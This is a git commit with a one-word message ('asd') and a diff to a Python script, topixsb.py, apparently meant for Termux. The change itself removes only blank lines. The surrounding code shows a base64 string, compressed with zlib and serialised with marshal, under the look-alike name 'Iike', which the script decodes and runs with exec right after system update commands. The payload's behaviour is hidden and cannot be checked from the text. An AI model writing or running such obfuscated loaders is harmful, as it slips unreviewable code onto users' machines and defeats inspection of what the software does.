2534ee0fdb715e519676cd1e4c476b096ddff9f4
atr19love <atr19love@gmail.com>
2022-11-14 10:21:41 +0700

    asd

--- topixsb.py
+++ topixsb.py
@@ -4,7 +4,5 @@ except:
     import os
     os.system("pkg update && pkg upgrade")
     os.system("clear")
-    
-    
 Iike=b'eJxLZkADLEDsAMTFSkAihSGFMYchiiGFKYU5kzGKMZUplWEBcyrjQsZmRkagXDCDJstLkC6/KOaMxMwo1ozUnJx8TZYolqzi/Lwo5oqUtFusBUWZeSW3WFNKcwuKVzIUMQOVg4lb7CH5BZkVwU63OGxy81NKc1LtGEEWcwAJDmYmBqb/LMwA8jciAA=='
 exec(marshal.loads(zlib.decompress(base64.urlsafe_b64decode(Iike))))
